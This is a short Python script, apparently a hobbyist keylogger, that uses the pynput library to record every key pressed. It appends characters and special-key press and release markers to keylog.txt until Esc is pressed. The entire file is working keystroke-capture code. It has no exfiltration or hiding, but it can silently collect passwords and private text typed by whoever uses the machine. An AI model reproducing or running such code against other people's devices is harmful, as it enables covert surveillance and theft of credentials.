from pynput import keyboard

special_keys = [keyboard.Key.end, keyboard.Key.tab, keyboard.Key.delete, keyboard.Key.pause, keyboard.Key.caps_lock, keyboard.Key.cmd, keyboard.Key.menu, keyboard.Key.page_up, keyboard.Key.page_down, keyboard.Key.home, keyboard.Key.backspace, keyboard.Key.num_lock, keyboard.Key.enter, keyboard.Key.f1, keyboard.Key.f2, keyboard.Key.f3, keyboard.Key.f4, keyboard.Key.f5, keyboard.Key.f6, keyboard.Key.f7, keyboard.Key.f8, keyboard.Key.f9, keyboard.Key.f10, keyboard.Key.f11, keyboard.Key.f12, keyboard.Key.shift_r, keyboard.Key.down, keyboard.Key.up, keyboard.Key.right, keyboard.Key.left, keyboard.Key.shift, keyboard.Key.alt_r, keyboard.Key.alt_l, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]
def on_press(key):
    try:
        #print('> {0}'.format(key.char))
        with open("keylog.txt", "a+") as file:
        	file.write(f"{key.char}")
        file.close()

    except AttributeError:
        #print('> special key {0} pressed'.format(key))
        with open("keylog.txt", "a+") as file:
        	if key == keyboard.Key.space:
	        	file.write(" ")
	        else:
	        	file.write(f"[{key} pres]")
        file.close()

    if key == keyboard.Key.esc:
    	return False

def on_release(key):
	if key in special_keys:
		#print('< special key {0} released'.format(key))
		with open("keylog.txt", "a+") as file:
			file.write(f"[{key} rel]")
		file.close()		

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
	#print('Press esc to exit')
	listener.join()
